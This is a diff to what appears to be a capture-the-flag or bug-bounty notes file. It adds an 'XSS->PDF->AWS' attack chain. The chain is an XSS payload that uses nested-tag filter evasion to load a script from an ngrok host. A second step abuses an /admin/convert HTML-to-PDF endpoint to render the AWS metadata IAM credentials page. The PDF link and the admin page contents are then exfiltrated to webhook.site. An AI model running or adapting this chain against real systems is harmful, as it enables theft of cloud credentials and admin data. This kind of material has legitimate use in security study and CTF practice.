@@ -54,8 +54,39 @@ __Endpoints__
 - /bugs
 - /admin - 403
 
+___XSS->PDF->AWS___
 ```javascript
-fetch(id).then(function(r){r.text()}).then(function(data){fetch(name+btoa(data))})
+// /?alias=<scrscriptipt src="https://1fc3-122-164-175-43.in.ngrok.io/hack.js"></scrscriptipt>
+
+// step 2
+
+const htmlCode = "<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/bugbase-sales-team' width='1000px' height='1000px'></iframe>";
+const xhr = new XMLHttpRequest();
+xhr.open("POST", "/admin/convert");
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.onload = function() {
+        if (xhr.status === 200) {
+                const response = JSON.parse(xhr.responseText);
+                fetch("https://webhook.site/01bcd1d7-0732-4cf2-a6f9-3a7056d8bdee", {
+                    method: "POST",
+                    body: response.pdfLink
+                })
+        }
+};
+xhr.send(JSON.stringify({htmlCode: htmlCode}));
+
+// step 1
+// fetch("/admin")
+//     .then(
+//         data => data.text()
+//     )
+//     .then(admin => {
+//         // fetch("https://c017-122-164-175-43.in.ngrok.io/?" + JSON.stringify(admin))
+//         fetch("https://webhook.site/01bcd1d7-0732-4cf2-a6f9-3a7056d8bdee", {
+//             method: "POST",
+//             body: JSON.stringify(admin)
+//         })
+//     })
 ```
 
 ---
